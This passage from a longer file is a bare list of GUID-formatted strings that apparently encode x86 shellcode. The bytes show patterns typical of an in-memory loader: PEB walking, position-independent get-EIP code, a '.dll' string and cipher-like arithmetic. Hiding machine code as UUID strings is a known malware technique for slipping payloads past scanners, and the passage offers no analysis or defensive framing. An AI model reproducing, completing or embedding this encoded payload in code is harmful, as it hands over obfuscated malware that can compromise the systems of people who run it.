        "ff000000-2474-8d10-8684-0000006a01ff",
        "56ff5010-8b7c-85d8-db74-778364242400",
        "2424448d-ff50-2474-1453-57ff96cc0000",
        "8de88b00-8486-0000-0089-442418837c24",
        "4e740010-046a-0068-3000-00ff7424186a",
        "3c56ff00-8689-0d60-0000-85c07413ff74",
        "50531024-17e8-0024-0033-ed83c40c45eb",
        "ffed3302-2474-6a10-0053-e8252400008b",
        "83242444-0cc4-6a53-01ff-1050ff968800",
        "ff570000-d096-0000-00ff-742430ff96d0",
        "ff000000-2474-ff34-96d0-00000085ed74",
        "34be834e-0002-0300-7545-ffb6580d0000",
        "0d60be8b-0000-868d-480d-000057508d86",
        "00000d38-e850-209e-0000-ff762c8d862c",
        "ff00000c-2876-e850-621f-000083c41c3b",
        "00051887-7500-3b0c-971c-05000075048b",
        "3302ebc5-5fc0-5d5e-5b81-c4ec020000c3",
        "01dcec81-0000-5553-568b-b424f0010000",
        "3c6e8b57-448b-782e-85c0-0f84e5000000",
        "8b303c8d-185f-db85-0f84-d70000008b47",
        "03d2331c-89c6-2454-1089-4424248b4720",
        "4489c603-1424-478b-2403-c6894424208b",
        "c6030c47-088a-c984-742a-8b7424108d94",
        "0000e824-2b00-80d0-c920-46880c02408a",
        "75c98408-89f2-2474-108b-b424f4010000",
        "1024548b-b4ff-0424-0200-008d8424ec00",
        "84c60000-ec14-0000-0000-ffb424040200",
        "97e85000-001e-8900-4424-2483c40c8b44",
        "c0831424-89fc-2454-1c8d-049889442410",
        "0424b4ff-0002-8b00-08ff-b42404020000",
        "e851ce03-1e66-0000-3344-242483c40c33",
        "3b1c2454-2484-01f8-0000-75093b9424fc",
        "74000001-8b1d-2444-1083-e80489442410",
        "7501eb83-33bb-5fc0-5e5d-5b81c4dc0100",
        "448bc300-2024-4c8b-2424-0fb74458fe8b",
        "d6038114-d73b-7672-8b44-2e7c03c73bd0",
        "c9336c73-0a38-1d74-8d5c-24288bfa2bda",
        "733cf983-8a10-8807-043b-3c2e74074147",
        "75003f80-42eb-44c7-0c29-646c6c0003ca",
        "1138d233-1774-7c8d-2468-2bf983fa7f73",
        "42018a0c-0488-410f-8039-0075ef8d4424",
        "1444c668-0068-8d50-4424-2c5056ffb424",
        "000001fc-0ce8-0000-0083-c4108bd08bc2",
        "ffff62e9-55ff-ec8b-64a1-1800000033c9",
        "8b575653-3040-7d8b-088b-400c8b700c39",
        "2a74184e-5d8b-850c-c975-3f395e187412",
        "1475ff51-76ff-5718-e8c3-1b000083c410",
        "368bc88b-7e83-0018-75dd-85c9751cff75",
        "0be85710-001b-5900-5985-c0740bff7514",
        "3457ff50-c88b-02eb-33c9-5f5e8bc15b5d",
        "748b56c3-0c24-3357-ff8b-4e1885c97409",
        "ff51018b-0850-7e89-188b-4e1c85c97409",
        "ff51018b-0850-7e89-1c8b-4e1485c97409",
        "ff51018b-0850-7e89-148b-4e0885c9741e",
        "8b1076ff-5101-50ff-508b-4608508b08ff",
        "468b2c51-5008-088b-ff51-08897e088b4e",
        "74c98510-8b09-5101-ff50-08897e108b4e",
        "74c9850c-8b09-5101-ff50-08897e0c8b4e",
        "74c98504-8b09-5101-ff50-08897e048b0e",
        "0874c985-018b-ff51-5008-893e5f5ec38b",
        "83042444-10c0-fff0-008b-00c20400b801",
        "c2800040-000c-01b8-4000-80c210008b44",
        "74ff0424-1824-74ff-2414-8b4008ff7424",
        "088b5014-51ff-c228-1800-b801400080c2",
        "8b570014-247c-8514-ff75-07b803400080",
        "8b5616eb-2474-8b0c-4608-508b08ff5104",
        "8908468b-3307-5ec0-5fc2-10008b442408",
        "0775c085-03b8-0040-80eb-08c700010000",
        "c2c03300-0008-8b55-ecff-75288b4508ff",
        "75ff2475-8b20-0848-ff75-1cff75188b11",
        "500c75ff-ff51-2c52-5dc2-2400558bec81",
        "000204ec-5300-5756-e88b-1900008b750c",
        "401f7ab9-bf00-367b-4000-2bcf03c18b0e",
        "71e80189-0019-b900-321c-40002bcf03c1",
        "41890e8b-e804-195e-0000-b9032040002b",
        "8bc103cf-890e-0841-e84b-190000b99f1c",
        "cf2b0040-c103-0e8b-8941-0ce838190000",
        "401c75b9-2b00-03cf-c18b-0e894110e825",
        "b9000019-1c51-0040-2bcf-03c18b0e8941",
        "1912e814-0000-b9b9-1c40-002bcf03c18b",
        "1841890e-ffe8-0018-00b9-1c1240002bcf",
        "0e8bc103-4189-e81c-ec18-0000b92e1140",
        "03cf2b00-8bc1-890e-4120-e8d9180000b9",
        "0040112e-cf2b-c103-8b0e-894124e8c618",
        "2eb90000-4011-2b00-cf03-c18b0e894128",
        "0018b3e8-b900-112e-4000-2bcf03c18b0e",
        "e82c4189-18a0-0000-b92e-1140002bcf03",
        "890e8bc1-3041-8de8-1800-00b9eb1f4000",
        "c103cf2b-0e8b-4189-34e8-7a180000b92e",
        "2b004011-03cf-8bc1-0e89-4138e8671800",
        "112eb900-0040-cf2b-03c1-8b0e89413ce8",
        "00001854-2eb9-4011-002b-cf03c18b0e89",
        "41e84041-0018-b900-2e11-40002bcf03c1",
        "41890e8b-e844-182e-0000-b92e1140002b",
        "8bc103cf-890e-4841-e81b-180000b92e11",
        "cf2b0040-c103-0e8b-8941-4ce808180000",
        "40112eb9-2b00-03cf-c18b-0e894150e8f5",
        "b9000017-1c49-0040-2bcf-03c18b0e8941",
        "17e2e854-0000-2eb9-1140-002bcf03c18b",
        "5841890e-cfe8-0017-00b9-6d1c40002bcf",
        "0e8bc103-4189-e85c-bc17-0000b92e1140",
        "03cf2b00-8bc1-890e-4160-e8a9170000b9",
        "00402013-cf2b-c103-8b0e-894164e89617",
        "41b90000-401c-2b00-cf03-c18b0e894168",
        "001783e8-b900-112e-4000-2bcf03c18b0e",
        "e86c4189-1770-0000-b92e-1140002bcf03",
        "890e8bc1-7041-5de8-1700-00b92e114000",
        "7d8bcf2b-0308-8bc1-0e89-41748d85fcfd",
        "6683ffff-0010-8d50-8719-060000897e14",
        "16e85750-0017-8300-c40c-8d5e048d85fc",
        "53fffffd-ff50-b897-0000-0085c075138b",
        "08468d0b-8d50-c087-0800-00508b1151ff",
        "5e5f1852-c95b-8bc3-5424-0c85d27507b8",
        "80004003-5feb-8b53-5c24-0c33c9568b74",
        "8b570c24-147e-848b-8f30-0800003b048b",
        "83410875-04f9-ee75-eb2a-33c98b848f40",
        "3b000008-8b04-0875-4183-f90475eeeb14",
        "848bc933-c08f-0008-003b-048b750c4183",
        "ee7504f9-3289-c033-eb08-832200b80240",
        "5e5f8000-c25b-000c-8b44-24046a006a00",
        "408bfd6a-500c-088b-ff51-3833c0c20800",
        "04244c8b-c883-f0ff-0fc1-411048c20400",
        "0424448b-74ff-0824-8b40-14ff504c33c0",
        "550008c2-ec8b-ec81-8000-0000568b7508",
        "70c68157-0004-8a00-0e33-c084c9743f8d",
        "d68b807d-fe2b-f980-3b74-123d80000000",
        "0c880b7d-4017-8a42-0a84-c975e985c074",
        "0c75ff1d-c646-0544-8000-03f08d458050",
        "001cb4e8-5900-8559-c075-bc40eb0233c0",
        "c3c95e5f-8b55-83ec-ec1c-837d0c007431",
        "458d1c6a-50e4-458b-08ff-750cff504483",
        "1d751cf8-7d81-00f4-1000-007514817dfc",
        "00020000-0b75-7d83-f804-750533c040c9",
        "c9c033c3-81c3-14ec-0200-00538b9c2424",
        "33000002-21c0-2444-0455-8bac24240200",
        "8b575600-24bc-0228-0000-8b8fe8000000",
        "840fc985-0082-0000-538d-876008000050",
        "0850878d-0000-ff50-d185-c00f889d0000",
        "24448d00-5024-458d-0c50-57e83d150000",
        "738d138b-8304-0cc4-8d87-700800008b0a",
        "448d5056-2c24-5250-ff51-0c85c078348b",
        "24548d06-5214-8b50-08ff-512885c07833",
        "14247c83-7400-8b1f-0e8d-4308508d8790",
        "50000008-118b-878d-8008-00005051ff52",
        "8303eb24-0026-c085-7809-83bfe8000000",
        "8d1c7500-0843-8d50-8790-080000508d87",
        "00000880-6a50-6a00-00ff-97e400000085",
        "831079c0-0863-3300-c0e9-1b0100008323",
        "8bd0eb00-0843-8b50-08ff-512885c00f88",
        "00000101-858d-010c-0000-8038008d730c",
        "438b0c75-5608-8b50-08ff-5134eb3e8d4c",
        "50512424-e857-1473-0000-83c40c8d4424",
        "97ff5024-00b0-0000-8b4b-088bf08d430c",
        "8b006a50-5611-ff51-5230-568944241cff",
        "0000b497-8b00-2444-188d-730c85c00f88",
        "000000a1-168b-438d-1050-8d87a0080000",
        "520a8b50-11ff-c085-0f88-870000008b85",
        "00000524-6483-2024-0089-44241c8d4424",
        "016a501c-116a-97ff-9800-00008bf085f6",
        "568b6374-330c-39c9-8d24-05000076138a",
        "05282984-0000-0488-0a41-3b8d24050000",
        "4b8bed72-8d10-1443-5056-518b11ff92b4",
        "f7000000-1bd8-33c0-d240-8bca89442410",
        "390c468b-2495-0005-0076-138894292805",
        "14880000-4108-8d3b-2405-000072ed56ff",
        "0000a497-8b00-2444-105f-5e5d5b81c414",
        "c3000002-ec81-0138-0000-5355568bb424",
        "00000148-ff57-2c76-ff76-28ff764cff76",
        "84e85648-0015-ff00-762c-8bf8ff762889",
        "ff38247c-5476-76ff-5056-e86c150000ff",
        "d88b2c76-76ff-8928-5c24-44ffb6ec0100",
        "e8b6ff00-0001-5600-e84e-15000083c43c",
        "6c89e88b-1024-ff85-7428-85db742485ed",
        "046a2074-0068-0030-00ff-3633db53ffd7",
        "ff85f88b-1a75-be83-3002-000002750353",
        "c883d5ff-5fff-5d5e-5b81-c438010000c3",
        "575636ff-77e8-0019-006a-208d44243453",
        "198ee850-0000-c483-188d-5f2883bf3402",
        "75030000-8b48-2d07-3c02-0000508d873c",
        "50000002-478d-5014-8d47-0450e8371600",
        "0473ff00-878d-0c2c-0000-ff3350e8fc14",
        "c4830000-3b1c-3087-0d00-000f855b0200",
        "34973b00-000d-0f00-854f-020000ff7304",
        "77ff33ff-ff34-3077-57e8-8d14000083c4",
        "30478914-c085-840f-66ff-ffff8db74002",
        "0e8a0000-c033-c984-743a-8d6c24448bd6",
        "f980ee2b-743b-3d12-0401-0000730b880c",
        "8a42402a-840a-75c9-e985-c0741746c644",
        "03004404-8df0-2444-4450-57e842120000",
        "beeb5959-ed33-3945-af3c-02000076578d",
        "778d3447-8938-2444-18ff-7304ff33ff76",
        "5736ff04-12e8-0014-008b-4c242c83c414",
        "c0850189-1d75-068b-3b87-a00100000f85",
        "000001a4-468b-3b04-87a4-0100000f8595",
        "45000001-c183-8304-c608-894c24183baf",
        "0000023c-b372-878b-2009-00006a025d3b",
        "571775c5-0fe8-fff1-ff59-85c00f846601",
        "b78b0000-0d60-0000-eb18-83f8030f8455",
        "8d000001-60b7-000d-0083-f80174048b74",
        "bf831c24-0570-0000-0174-2e57e873efff",
        "c08559ff-0c75-af39-7005-00000f842601",
        "e8570000-f057-ffff-5985-c0750c39af70",
        "0f000005-0f84-0001-0083-7e08010f849c",
        "8b000000-2486-0005-006a-04052f150000",
        "00300068-2500-f000-ffff-506a00ff5424",
        "85d88b2c-0fdb-dd84-0000-006830050000",
        "99e85356-0017-8300-c40c-837e08037422",
        "04087e83-1c74-6e39-0875-548d83280500",
        "868d5000-0528-0000-50e8-751500005959",
        "448d3beb-2024-00b9-0100-0050ffb62005",
        "868d0000-0528-0000-50ff-b6240500008d",
        "00052883-5000-8b66-4608-6648660bc10f",
        "ff50c0b7-1897-0001-0085-c0756b8bf383",
        "5074033e-3e83-7404-4b83-3e017417392e",
        "3e831374-7405-8305-3e06-75415657e88f",
        "eb00000c-8d36-2444-2450-5657e8d4faff",
        "0cc483ff-c085-0f74-8d44-2424505657e8",
        "000000a0-c483-8d0c-4424-245057e87ff5",
        "07ebffff-5756-e9e8-0300-00595983bf30",
        "03000002-0275-feeb-8b6c-24108b872009",
        "f8830000-7402-8305-f803-75378b87600d",
        "c0850000-2d74-b7ff-580d-00006a0050e8",
        "000016c0-5c8b-2024-83c4-0c6800c00000",
        "b7ff006a-0d60-0000-ffd3-83a7600d0000",
        "8b04eb00-245c-ff14-378b-b7300200006a",
        "8de85700-0016-8300-c40c-6800c000006a",
        "d3ff5700-fe83-7502-046a-00ffd533c0e9",
        "fffffcc1-ec81-027c-0000-538b9c248402",
        "c0330000-5655-b48b-2490-02000033ed21",
        "5718246c-7c8d-4824-abab-abab33c0833e",
        "44896602-1824-850f-9701-00008b842498",
        "8b000002-1448-788d-1c57-518b01ff5040",
        "880fc085-0174-0000-8b07-8d54241c5250",
        "51ff088b-8548-0fc0-88e9-0200008d4424",
        "016a502c-74ff-2424-ff93-a80000008d44",
        "6a502824-ff01-2474-24ff-93ac0000008b",
        "2b282444-2444-832c-c001-0f84e3000000",
        "6a55016a-ff0c-9c93-0000-0081c60c0400",
        "80e88b00-003e-7b74-8d84-248800000050",
        "f6e85356-000e-8300-c40c-8d442414508d",
        "008c2484-0000-ff50-9394-000000ff7424",
        "b8f08b14-2008-0000-6a00-6a0866894424",
        "9c93ff44-0000-8300-6424-1000837c2414",
        "24448900-7640-3366-c0ff-3486ff93b000",
        "8d500000-2444-5014-ff74-2448ff93a000",
        "448b0000-1024-8940-4424-103b44241472",
        "6a3aebd8-6a01-b800-0820-00006a086689",
        "ff442444-9c93-0000-0083-642410008944",
        "448d4024-1824-ff50-93b0-000000508d44",
        "ff501424-2474-ff48-93a0-000000836424",
        "448d0010-3824-8d50-4424-145055ff93a0",
        "83000000-2464-0050-8d54-24685233c08d",
        "404c2474-8966-2444-4c8b-075583ec108b",
        "50088bfc-a5a5-a5a5-ff91-9400000085ed",
        "01a0840f-0000-74ff-2440-ff93a4000000",
        "a493ff55-0000-e900-8a01-0000212fe983",
        "8d000001-2484-0088-0000-508d860c0200",
        "e8535000-0dd5-0000-83c4-0c8d84248800",
        "ff500000-b093-0000-008b-e8896c242085",
        "52840fed-0001-8d00-8424-88000000508d",
        "00030c86-5000-e853-a10d-000083c40c8d",
        "00882484-0000-ff50-93b0-000000894424",
        "0fc08524-1684-0001-008b-8c2498020000",
        "8d14518b-1879-5557-528b-0a897c2440ff",
        "c0854451-880f-00ea-0000-81c60c040000",
        "3e80ed33-0f00-9a84-0000-008d84248800",
        "56500000-e853-0d43-0000-83c40c8d4424",
        "848d5014-8c24-0000-0050-ff9394000000",
        "142474ff-4489-3424-556a-0cff939c0000",
        "85e88b00-74ed-835e-6424-1000837c2414",
        "8b527600-247c-3330-c0ff-3487ff93b000",
        "086a0000-4489-6424-5866-894424588d44",
        "8d505824-2444-5014-55ff-93a00000008b",
        "79f685f0-5509-93ff-a400-000033ed8b44",
        "89401024-2444-3b10-4424-1472bc8b7c24",
        "78f68534-8b3b-8d07-5424-78525583ec10",
        "6024748d-088b-fc8b-6a00-a56818010000",
        "8ba5a5a5-2474-5644-50ff-91e400000085",
        "550774ed-93ff-00a4-0000-8b6c2420eb08",
        "20246c8b-748b-2424-56ff-93b400000055",
        "00b493ff-0000-c033-405f-5e5d5b81c47c",
        "c3000002-ec81-0340-0000-8b8424480300",
        "9c8b5300-4824-0003-0005-280500005556",
        "4489f633-3024-688b-3c03-e88974241456",
        "10247489-7489-2824-896c-242cff53388b",
        "458b66d0-8b04-3c4a-663b-4411040f8515",
        "8b000008-5045-4489-2448-8974244c8b85",
        "000000a4-4489-2024-85c0-75078b453489",
        "570c2444-036a-c933-8dbb-250600005a41",
        "56003f80-2775-0068-0000-086a408d4424",
        "68565058-001f-000f-8d44-245c50ff9320",
        "85000001-0fc0-bc85-0700-00eb7a565256",
        "00006851-8000-ff57-5360-8bf883ffff0f",
        "0007a284-8500-0fff-849a-0700008d4424",
        "c0570f3c-5750-0f66-1344-2444ff536485",
        "80840fc0-0007-8b00-4550-3b44243c0f87",
        "00000773-6857-0000-0001-6a0258505656",
        "0f001f68-8d00-2444-5c50-ff9320010000",
        "fff08b57-9093-0000-0085-f60f85460700",
        "25bb8d00-0006-6a00-0458-50566a025850",
        "3424448d-5650-5656-8d44-242c50ff5370",
        "2474ff50-ff68-2493-0100-008b7424348b",
        "8b10244c-3c76-f103-8974-241c85c0740b",
        "0000033d-0f40-fc85-0600-0085c90f84f4",
        "80000006-003f-4a74-8d44-2430506a045f",
        "2474ff57-5130-53ff-4857-6800300000ff",
        "006a5475-53ff-ff3c-7554-8bf8ff742414",
        "50247c89-e857-1146-0000-ff7424346a00",
        "242474ff-5be8-0011-008b-4c242883c418",
        "448b08eb-3c24-4489-2448-ff7554ff7424",
        "19e85138-0011-8b00-4424-1c33c9836424",
        "c4830020-890c-3446-0fb7-461483c01803",
        "244489c6-663c-4e3b-0673-448b5c24148d",
        "ee8b1078-37ff-478b-048b-77fc03442438",
        "14247403-5650-d5e8-1000-000fb6068d7f",
        "0cc48328-4789-0fd0-b745-06433bd872d4",
        "54249c8b-0003-8b00-6c24-2c8b74241c8b",
        "8b102454-2bfa-347d-837c-2424000f84c2",
        "85000000-0fff-ba84-0000-008b86a00000",
        "100c8d00-4403-2424-8944-243803c2894c",
        "c83b2024-830f-009b-0000-8b410485c00f",
        "00009084-8d00-0871-eb6d-0fb7368b4424",
        "81ce8b20-ffe1-000f-0003-088b44241c3b",
        "43735048-c166-0cee-6683-fe0a74086a03",
        "f03b6658-0575-3c01-11eb-1d33c040663b",
        "8b0775f0-c1c7-10e8-eb0b-6a0258663bf0",
        "b70f0c75-01c7-1104-8b54-2410eb096685",
        "1f850ff6-0005-8b00-7424-146a025903f1",
        "20244c8b-418b-0304-c189-7424143bf075",
        "24448b89-8b38-03ce-c289-7424203bf00f",
        "ffff6582-8bff-2444-1c8b-808000000085",
        "c4840fc0-0000-8d00-3410-837e0c008974",
        "840f1824-00b3-0000-8b46-0c03c25053e8",
        "0000093e-548b-1824-8b7e-108944244003",
        "03068bfa-89c2-247c-2859-59894424148b",
        "74c98508-8b71-246c-388b-b42458030000",
        "6a510c79-5500-e853-a409-0000eb328d7a",
        "83f90302-047e-7400-1957-53e893f2ffff",
        "c0855959-0c74-838b-0801-00008b7c2420",
        "006a11eb-5557-e853-7409-00008b7c2430",
        "8910c483-8b07-2444-148b-5424106a0459",
        "f903c103-4489-1424-897c-24208b0885c9",
        "748b9e75-1824-c683-1489-742418837e0c",
        "51850f00-ffff-8bff-6c24-2c8b44241c8b",
        "0000e080-8500-0fc0-848c-0000008d7004",
        "7489f203-1824-068b-85c0-747d03c25053",
        "00086de8-8b00-2454-1889-442440595985",
        "8b5574c0-0c7e-4e8b-0803-fa03ca894c24",
        "85078b14-74c0-8b41-6c24-386a045e7904",
        "05ebc933-4a8d-0302-c833-d285c00f49c2",
        "53555150-c7e8-0008-008b-4c242403fe83",
        "018910c4-ce03-078b-8b54-2410894c2414",
        "ca75c085-748b-1824-83c6-20897424188b",
        "75c08506-8b87-246c-2c8b-44241c8d7c24",
        "593e6a54-f58b-408b-28f3-a58b7c245803",
        "10efc1c2-046a-f76b-2868-003000008944",
        "7c893424-1c24-6a56-00ff-533c56ff7424",
        "24448940-5020-25e8-0e00-0033c083c40c",
        "74833940-0005-7500-4280-bb2506000000",
        "75ff2175-6a54-ff00-7424-18e8240e0000",
        "6a5475ff-ff00-2474-48e8-160e000083c4",
        "8b18eb18-2444-8548-c074-10ff755450ff",
        "e8182474-0dd8-0000-83c4-0c80bb250600",
        "58750000-74ff-1024-ff53-7050ff932801",
        "c0850000-850f-032d-0000-8b44241033c9",
        "24244c39-8068-0000-0051-6a020f45c121",
        "8934244c-2444-581c-508d-442434505151",
        "24448d51-502c-53ff-7050-ff742468ff93",
        "00000124-c085-850f-eb02-00008d442430",
        "ff086a50-2474-ff30-7424-1cff534833c0",
        "24244489-ff85-840f-ab00-00008b7c2418",
        "3c24748b-c783-8b0c-5718-8bea8bcac1ed",
        "1deac11e-e9c1-831f-e201-85d1757785d5",
        "206a0474-2feb-c28b-83f0-018944243c23",
        "74c585c1-800e-25bb-0600-00006a085e6a",
        "331deb04-40c0-c833-8bc5-83f00123c185",
        "6a0574c2-5e10-0ceb-234c-243c85cd6a02",
        "f0450f58-548b-1024-8b0f-03d18b442414",
        "24443948-7324-8b07-4728-2bc1eb038b47",
        "24648304-0030-4c8d-2430-51565052ff53",
        "24448b48-4024-c783-2889-4424243b4424",
        "60820f14-ffff-8dff-4424-3033ff506a02",
        "b4ff5058-8824-0000-0089-7c243cff7424",
        "4853ff1c-448b-1c24-8b4c-24108bb0c000",
        "f6850000-2a74-748b-0e0c-85f674228b06",
        "1c74c085-046a-575b-6a01-51ffd08b4c24",
        "8bf30310-8506-75c0-ee8b-9c2454030000",
        "5824ac8b-0003-6a00-0358-3945000f85e6",
        "33000000-40c0-5057-8b84-248400000051",
        "d0ffc103-bd80-030c-0000-000f841d0100",
        "248c8b00-00cc-0000-8b54-241085c90f84",
        "0000010e-748b-1811-85f6-0f8402010000",
        "2011448b-7e8d-8bff-6c11-1c03c28b4c11",
        "03ea0324-89ca-244c-3c8d-3cb88b8c2458",
        "8b000003-8107-0cc1-0300-0003c25150e8",
        "00000c05-548b-1824-5959-85c0740f6a04",
        "83f82b58-01ee-d475-e9c9-0000008b4424",
        "44b70f3c-fe70-748b-8500-03f20f84b400",
        "ac8b0000-5824-0003-008d-bd0c04000080",
        "3174003f-bd83-050c-0000-0074128d8424",
        "0000014c-5750-e853-e104-000083c40c83",
        "00050cbd-0000-848d-244c-0100000f44c7",
        "ebd6ff50-ff59-ebd6-558d-850c04000080",
        "20740038-8c8d-4c24-0100-00515053e8aa",
        "8d000004-2484-0158-0000-5053e8740200",
        "14c48300-7d39-7404-1857-5757ff742438",
        "53ff5757-855c-74c0-156a-ff50ff5358eb",
        "18a1640d-0000-ff00-7030-ff5424308b54",
        "036a1024-3958-3083-0200-0075096affff",
        "548b4c53-1024-d285-7442-0fb744245abe",
        "0000c000-c06b-5628-50ff-742420ff5340",
        "4824448b-c085-0c74-56ff-b424ac000000",
        "4053ff50-74ff-1024-ff53-7050ff932801",
        "74ff0000-4424-93ff-9000-00008b842458",
        "ff000003-24b0-0005-006a-00ff74243ce8",
        "00000ab0-c483-5f0c-5e5d-5b81c4400300",
        "ec81c300-02f4-0000-538b-9c24fc020000",
        "046a5655-838b-0d58-0000-33f668003000",
        "45048d00-0002-0000-5056-ff533c8be885",
        "84840fed-0001-8b00-8424-080300008b88",
        "00000524-2805-0005-0003-c951556aff50",
        "53ff5656-8d50-2444-5889-4424148d4424",
        "e8535014-dfa5-ffff-8d44-244c89442424",
        "2424448d-5350-48e8-deff-ff8d84249400",
        "44890000-3824-448d-2438-5053e8dbe9ff",
        "18c483ff-5656-93ff-ec00-000085c00f85",
        "000000f5-448d-0c24-508d-83d008000050",
        "8d56036a-b083-0008-0050-ff93f0000000",
        "850fc085-00d1-0000-8b4c-240c8d442410",
        "00838d50-0009-5000-8b11-51ff1285c00f",
        "0000a085-8b00-2444-1050-8b08ff510c85",
        "84850fc0-0000-8b00-4c24-0c8d54241489",
        "5234244c-8b51-ff01-500c-85c0756d578d",
        "01002484-0000-8d50-8311-0600005053e8",
        "000002c9-c483-8d0c-8424-0001000050ff",
        "0000b093-8b00-244c-108b-f86a0257518b",
        "2052ff11-8b57-fff0-93b4-0000005f85f6",
        "448b2775-1024-f633-5656-568b08565656",
        "50555656-51ff-8514-c075-108b44240c6a",
        "088b5002-51ff-eb14-0233-f68b44241050",
        "51ff088b-8b08-2444-0c50-8b08ff511c8b",
        "500c2444-088b-51ff-088b-83580d00008d",
        "00024504-0000-5650-55e8-f608000083c4",
        "c000680c-0000-5556-ff53-405e5d5b81c4",
        "000002f4-81c3-94ec-0000-0064a1180000",
        "9c8b5300-9c24-0000-0055-8b4030568944",
        "838d0c24-0348-0000-5750-ff53388be833",
        "3c558bc0-d503-b70f-7a14-0fb7720603fa",
        "85184f8d-74f6-8b12-9340-030000391174",
        "c1834035-3b28-72c6-f48b-7424108b7c24",
        "7853ff10-c933-e88b-85f6-74408bd78d42",
        "24548904-8b18-39d0-2874-1d413bce72ee",
        "18246c8b-2eeb-c06b-2803-c78b78248b70",
        "c1fd0320-02ee-c9eb-ffb4-24ac0000008b",
        "551c246c-93ff-0110-0000-eb088b6c2410",
        "18246c89-53ff-3374-c98b-d085f6742d39",
        "0a740457-8341-04c7-3bce-72f3eb1e6a01",
        "24448d55-5024-93ff-0001-00006a088d44",
        "57502024-d7e8-0007-0083-c40c8b442410",
        "8b0c408b-0c78-7f83-1800-0f841f010000",
        "0370838d-0000-d08b-8954-24148a0233ed",
        "10246483-4500-c933-84c0-0f84ed000000",
        "24245c8d-f28b-da2b-8bd5-3c3b742981f9",
        "00000080-2173-773c-7504-33edeb0e8bea",
        "0875703c-44c7-1024-0100-000088041e41",
        "84068a46-75c0-8bd1-9c24-a800000085c9",
        "00a7840f-0000-448b-2414-40c6440c2400",
        "4489c103-1424-448d-2424-6a0050ff7718",
        "016ae853-0000-548b-2424-8bf083c41085",
        "75840ff6-ffff-85ff-ed74-33837c241000",
        "d6ff1074-548b-1424-8bf0-85f60f845aff",
        "36ffffff-e853-ea9a-ffff-8b54241c5959",
        "840fc085-ff44-ffff-8b44-2420eb34837c",
        "74001024-ff10-8bd6-5424-148bf085f60f",
        "ffff2784-ffff-5336-e867-eaffff8b5424",
        "8559591c-0fc0-1184-ffff-ff8b4424188b",
        "548b0440-1424-0689-e9ff-feffff8b3f8d",
        "00037083-8300-187f-000f-85e7feffff5f",
        "5dc0335e-5b40-c481-9400-0000c38b4424",
        "01006804-0000-74ff-2410-6affff742414",
        "006a006a-50ff-c350-e800-0000005883e8",
        "8b55c305-8bec-0c55-83ec-4033c9535683",
        "3857ffcb-740a-8d16-75c0-2bf283f94073",
        "41028a0c-0488-4216-803a-0075ef807c0d",
        "44c62ebc-c00d-7400-0dc7-440dc02e646c",
        "0d44c66c-00c4-a164-1800-00008b40308b",
        "788b0c40-8b0c-1877-85f6-74318b463c8b",
        "3378304c-85c0-74c9-1a8b-44310c03c650",
        "50c0458d-57e8-0006-008b-d833c0595985",
        "8b1974db-853f-75db-cc85-c0750a8d45c0",
        "08458b50-50ff-5f30-5e5b-c9c38bc6ebf7",
        "0090ec81-0000-5553-5657-8bbc24a80000",
        "85f63300-0fff-3384-0100-008b4f3c894c",
        "448b1824-7839-c085-0f84-200100008d1c",
        "20438b38-538b-031c-c789-44241003d78b",
        "c7032443-5489-1c24-39b4-24ac0000000f",
        "0000e584-8b00-186b-85ed-0f84ee000000",
        "8368048d-fec0-4489-2414-8b4424108d04",
        "fcc083a8-4489-1024-8b00-ffb424ac0000",
        "50c70300-80e8-0005-0059-5985c075108b",
        "8b142444-244c-0f1c-b700-8b348103f78b",
        "83102444-246c-0214-83e8-048944241083",
        "047401ed-f685-c074-8b4c-24183bf37276",
        "7c39448b-c303-f03b-736c-33c9380e741d",
        "20245c8d-d68b-de2b-83f9-3c73108a0288",
        "2e3c1304-0774-4241-803a-0075ebc7440c",
        "6c6c6421-3300-41d2-03ce-381174178d74",
        "f12b6024-fa83-733f-0c8a-014288040e41",
        "75003980-8def-2444-60c6-44146000508d",
        "50242444-ff57-24b4-b000-0000e8d4e2ff",
        "10c483ff-f08b-c68b-eb16-8b8424b00000",
        "10432b00-348b-0382-f7e9-6effffff33c0",
        "5b5d5e5f-c481-0090-0000-c3558bec64a1",
        "00000018-c933-8b56-4030-8b400c8b700c",
        "c98520eb-2375-75ff-18ff-7514ff7510ff",
        "ff500c75-0875-d5e8-e0ff-ff8b3683c418",
        "468bc88b-8518-75c0-d98b-c15e5dc383ec",
        "5c8b5314-2424-c033-5556-33ed8944240c",
        "247c8b57-332c-89f6-7424-2c8b4c24288a",
        "c984080c-1e74-f883-4074-19884c2c1445",
        "247c8940-892c-2444-1089-74242c83fd10",
        "54eb6f75-106a-2b58-c58d-7424145003f5",
        "e856006a-03fc-0000-83c4-0cc6068083fd",
        "5321720c-448d-1824-5750-e8560000006a",
        "33f83310-8dda-2444-246a-0050e8d30300",
        "18c48300-448b-1024-8b74-242cc1e00346",
        "20244489-7489-2c24-538d-4424185750e8",
        "00000021-f833-c483-0c8b-44241033da33",
        "0ff685ed-6284-ffff-ff8b-c78bd35f5e5d",
        "14c4835b-83c3-10ec-8b44-24188b54241c",
        "8b565553-2474-3320-db57-8d7c2410a5a5",
        "4c8ba5a5-1424-748b-241c-8b6c24188b7c",
        "4c891024-2824-ce8b-c1c8-088b74242803",
        "08cec1c2-c733-f703-c1c2-0333f3c1c703",
        "6c89d033-2824-fe33-8be9-4383fb1b72d6",
        "5b5d5e5f-c483-c310-8b54-241083ec1453",
        "20245c8b-8b55-246c-2885-d20f84ec0000",
        "8dc03300-0f4b-8940-4c24-2c2bc3568944",
        "8d570c24-2444-3b14-c177-048d4424238b",
        "247c8df3-3314-a5c9-a5a5-a58b7424288b",
        "44318e04-148c-8341-f904-72f38b742420",
        "1c24448b-7c8b-1824-8b4c-2414c7442430",
        "00000010-cf03-c603-c1c7-0533f9c1c608",
        "c1c1f033-0310-03c7-cec1-c707c1c60d33",
        "c1f133f8-10c0-6c83-2430-0175d78b5c24",
        "244c8928-3314-89c9-7424-20897c241889",
        "8b1c2444-8b04-4431-8c14-4183f90472f3",
        "3b5e106a-8bd6-0fca-47ce-85c974158d7c",
        "f58b1424-fd2b-d98b-8a04-3730064683eb",
        "8bf57501-245c-2b10-d103-e98b4c243480",
        "08750101-8d49-0b04-85c0-7ff38b5c242c",
        "850f4b8d-0fd2-2885-ffff-ff5f5e5d5b83",
        "83c314c4-14ec-4c8b-2418-836424100053",
        "246c8b55-8a24-5601-5788-450083cfff8d",
        "f6330145-4489-1824-33db-8d4101895c24",
        "24448910-8d14-2444-1450-e86701000059",
        "840fc085-0132-0000-8d44-241450e85401",
        "c0850000-448d-1824-5950-747de8450100",
        "c0855900-3774-046a-33f6-5b8d44241450",
